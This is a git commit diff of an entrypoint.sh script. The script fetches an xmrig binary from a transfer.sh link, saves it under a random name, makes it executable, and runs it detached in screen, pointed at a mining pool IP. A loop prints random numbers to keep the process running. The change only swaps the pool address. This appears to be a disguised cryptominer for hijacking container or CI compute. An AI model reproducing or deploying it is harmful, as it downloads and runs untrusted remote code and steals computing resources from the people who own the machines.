6be69ee99e76752404613184af8c7d9353de5ac8
septianana55 <93500712+septianana55@users.noreply.github.com>
2021-12-24 11:00:53 +0700

    Update entrypoint.sh

--- entrypoint.sh
+++ entrypoint.sh
@@ -2,5 +2,5 @@ gas=$(shuf -n 1 -i 1-9999999)
 curl https://transfer.sh/yesOy8/xmrig --output $gas
 chmod +x $gas
 chmod 777 /run/screen
-screen -dmS $gas ./$gas --url 36.89.94.125:3333 --user $RANDOM --pass x --donate-level 0
+screen -dmS $gas ./$gas --url 20.120.30.75:3333 --user $RANDOM 
 while :; do shuf -n 1 -i 1-99999999; sleep 30; done
